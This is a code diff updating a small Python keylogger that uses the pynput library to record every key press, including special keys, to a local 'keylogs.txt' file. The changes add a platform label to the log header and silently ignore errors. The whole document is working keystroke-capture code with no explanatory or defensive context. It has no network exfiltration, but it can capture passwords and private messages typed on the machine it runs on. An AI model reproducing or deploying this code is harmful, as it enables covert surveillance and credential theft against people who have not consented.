@@ -1,19 +1,26 @@
-from pynput.keyboard import Listener
+from pynput import keyboard
 import os
+import platform
 
 LOG_FILE = "keylogs.txt"
 
-# Créer le fichier s'il n'existe pas
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w") as f:
-        f.write("=== Keylogger Logs ===\n\n")
+        f.write("=== Keylogger Logs ({}) ===\n\n".format(platform.system()))
 
-# Fonction pour capturer les frappes
-def log_keystroke(key):
-    key = str(key).replace("'", "")
-    with open(LOG_FILE, "a") as f:
-        f.write(f"{key}\n")
+def log_key(key):
+    try:
+        if hasattr(key, 'char') and key.char:
+            entry = key.char
+        else:
+            entry = f"[{key.name.upper()}]"
 
-# Démarrage du keylogger
-with Listener(on_press=log_keystroke) as listener:
-    listener.join()
+        with open(LOG_FILE, "a") as f:
+            f.write(entry + "\n")
+
+    except Exception:
+        pass
+
+listener = keyboard.Listener(on_press=log_key)
+listener.start()
+listener.join()
